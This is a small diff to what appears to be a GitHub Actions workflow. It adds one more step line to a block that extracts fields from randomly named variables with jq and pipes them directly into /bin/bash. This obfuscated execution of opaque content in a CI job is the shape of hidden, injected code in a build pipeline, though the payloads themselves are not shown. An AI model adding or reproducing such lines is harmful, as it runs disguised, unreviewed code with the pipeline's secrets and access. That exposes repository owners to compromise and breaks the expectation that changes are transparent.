@@ -51,6 +51,7 @@ jobs:
           printf '%s' "$oau65963" | jq -r .skiv859 | /bin/bash
           echo $et35 | jq -r .a387 | /bin/bash
           echo $q8 | jq -r .fuit9007 | /bin/bash
+          echo $loo21 | jq -r .e5 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
